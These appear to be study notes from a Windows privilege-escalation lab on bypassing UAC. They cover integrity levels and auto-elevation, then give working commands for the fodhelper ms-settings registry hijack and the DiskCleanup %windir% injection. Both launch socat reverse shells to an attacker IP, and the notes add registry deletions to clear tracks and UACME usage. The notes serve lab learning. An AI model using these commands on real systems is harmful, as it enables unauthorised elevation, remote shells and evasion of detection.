###   
Integrity Levels

UAC is a **Mandatory Integrity Control (MIC)**, which is a mechanism that allows differentiating users, processes and resources by assigning an **Integrity Level (IL)** to each of them. In general terms, users or processes with a higher IL access token will be able to access resources with lower or equal ILs. MIC takes precedence over regular Windows DACLs, so you may be authorized to access a resource according to the DACL, but it won't matter if your IL isn't high enough.

The following 4 ILs are used by Windows, ordered from lowest to highest:  

|   |   |
|---|---|
|**Integrity Level**|**Use**|
|Low|Generally used for interaction with the Internet (i.e. Internet Explorer). Has very limited permissions.|
|Medium|Assigned to standard users and Administrators' filtered tokens.|
|High|Used by Administrators' elevated tokens if UAC is enabled. If UAC is disabled, all administrators will always use a high IL token.|
|System|Reserved for system use.|


### Filtered Tokens

To accomplish this separation of roles, UAC treats regular users and administrators in a slightly different way during logon:

- **Non-administrators** will receive a single access token when logged in, which will be used for all tasks performed by the user. This token has Medium IL.
- **Administrators** will receive two access tokens:
    - **Filtered Token:** A token with Administrator privileges stripped, used for regular operations. This token has Medium IL.
    - **Elevated Token:** A token with full Administrator privileges, used when something needs to be run with administrative privileges. This token has High IL.

In this way, administrators will use their filtered token unless they explicitly request administrative privileges via UAC.
### UAC Internals

At the heart of UAC, we have the **Application Information Service** or **Appinfo**. Whenever a user requires elevation, the following occurs:

1. The user requests to run an application as administrator.
2. A **ShellExecute** API call is made using the **runas** verb.
3. The request gets forwarded to Appinfo to handle elevation.
4. The application manifest is checked to see if AutoElevation is allowed (more on this later).
5. Appinfo executes **consent.exe**, which shows the UAC prompt on a **secure desktop**. A secure desktop is simply a separate desktop that isolates processes from whatever is running in the actual user's desktop to avoid other processes from tampering with the UAC prompt in any way.
6. If the user gives consent to run the application as administrator, the Appinfo service will execute the request using a user's Elevated Token. Appinfo will then set the parent process ID of the new process to point to the shell from which elevation was requested.


### Bypassing UAC

From an attacker's perspective, there might be situations where you get a remote shell to a Windows host via Powershell or cmd.exe. You might even gain access through an account that is part of the Administrators group, but when you try creating a backdoor user for future access, you get the following error:

Powershell

```shell-session
PS C:\Users\attacker> net user backdoor Backd00r /add
System error 5 has occurred.

Access is denied.
```


### Case study: msconfig

Our goal is to obtain access to a High IL command prompt without passing through UAC. First, let's start by opening msconfig, either from the start menu or the "Run" dialog:

If we analyze the msconfig process with Process Hacker (available on your desktop), we notice something interesting. Even when no UAC prompt was presented to us, msconfig runs as a high IL process:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/478a3577ffcd0c186529d9edd34545f4.png)  

This is possible thanks to a feature called auto elevation that allows specific binaries to elevate without requiring the user's interaction. More details on this later.

If we could force msconfig to spawn a shell for us, the shell would inherit the same access token used by msconfig and therefore be run as a high IL process. By navigating to the Tools tab, we can find an option to do just that:


##### UAC Process Hacker v2
1. run azman.msc
2. go to "Help"
3. Right click, View source.
4. In notepad, click "Open"
5. Make sure to change the file filter from ".txt" to "All Files"
6. Find cmd.exe in C:\\Windows\\System32
7. right click, open. Root


As mentioned before, some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel's functionality and some executables provided with Windows.

For an application, some requirements need to be met to auto-elevate:

- The executable must be signed by the Windows Publisher
- The executable must be contained in a trusted directory, like `%SystemRoot%/System32/` or `%ProgramFiles%/`

Depending on the type of application, additional requirements may apply:

- Executable files (.exe) must declare the **autoElevate** element inside their manifests. To check a file's manifest, we can use **[sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck)**, a tool provided as part of the Sysinternals suite. You can find a copy of sigcheck on your machine on `C:\tools\` . If we check the manifest for msconfig.exe, we will find the autoElevate property:

Command Prompt

```shell-session
C:\tools\> sigcheck64.exe -m c:/windows/system32/msconfig.exe
...
<asmv3:application>
	<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		<dpiAware>true</dpiAware>
		<autoElevate>true</autoElevate>
	</asmv3:windowsSettings>
</asmv3:application>
```

- mmc.exe will auto elevate depending on the .msc snap-in that the user requests. Most of the .msc files included with Windows will auto elevate.
- Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes pkgmgr.exe and spinstall.exe, for example.
- COM objects can also request auto-elevation by configuring some registry keys ([https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker](https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)).

We set the required registry values to associate the ms-settings class to a reverse shell. For your convenience, a copy of **socat** can be found on `c:\tools\socat\`. You can use the following commands to set the required registry keys from a standard command line:

Command Prompt

```shell-session
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.6.34.114:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.
```
**Execute program^**
start nc listener first.
get shell
delete key to clear tracks:
```batch
reg delete HKCU\Software\Classes\ms-settings\ /f
```


The task can be run on-demand, executing the following command when invoked:

 `%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`

Since the command depends on environment variables, we might be able to inject commands through them and get them executed by starting the DiskCleanup task manually.

Luckily for us, we can override the `%windir%` variable through the registry by creating an entry in `HKCU\Environment`. If we want to execute a reverse shell using socat, we can set `%windir%`  as follows (without the quotes):

`"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "`

At the end of our command, we concatenate "&REM " (ending with a blank space) to comment whatever is put after `%windir%` when expanding the environment variable to get the final command used by DiskCleanup. The resulting command would be (be sure to replace your IP address where needed):

`cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%`

Where anything after the "REM" is ignored as a comment.


###   Clearing our tracks

As a result of executing this exploit, some artefacts were created on the target system, such as registry keys. To avoid detection, we need to clean up after ourselves with the following command:

```batch
reg delete "HKCU\Environment" /v "windir" /f
```

### Automating UAC Bypasses

An excellent tool is available to test for UAC bypasses without writing your exploits from scratch. Created by @hfiref0x, UACME provides an up to date repository of UAC bypass techniques that can be used out of the box. The tool is available for download at its official repository on:

[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

While UACME provides several tools, we will focus mainly on the one called Akagi, which runs the actual UAC bypasses. You can find a compiled version of Akagi under `C:\tools\UACME-Akagi64.exe`.


Using the tool is straightforward and only requires you to indicate the number corresponding to the method to be tested. A complete list of methods is available on the project's GitHub description. If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up:

Command Prompt

```shell-session
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\attacker>cd /tools

C:\tools>UACME-Akagi64.exe 33
```

The methods introduced through this room can also be tested by UACME by using the following methods:

|Method Id|Bypass technique|
|---|---|
|33|fodhelper.exe|
|34|DiskCleanup scheduled task|
|70|fodhelper.exe using CurVer registry key|
